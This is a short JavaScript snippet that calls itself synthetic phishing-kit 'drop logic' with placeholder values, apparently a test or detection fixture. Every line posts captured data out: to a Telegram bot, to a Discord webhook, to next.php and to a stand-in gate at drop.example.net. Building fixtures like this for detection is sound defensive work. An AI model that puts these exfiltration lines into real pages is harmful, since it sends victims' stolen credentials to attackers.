// phishing kit drop logic (synthetic, values replaced at test time)
var token = "__TG_TOKEN__";
var chat_id = "-1001234567890";
$.post("https://api.telegram.org/bot__TG_TOKEN__/sendMessage", {chat_id: chat_id, text: data});
fetch("__DISCORD_WEBHOOK__", {method: "POST", body: JSON.stringify({content: data})});
var xhr = new XMLHttpRequest(); xhr.open("POST", "next.php", true);
$.ajax({ type: "POST", dataType: "json", url: "https://drop.example.net/gate/receive.php", data: d });
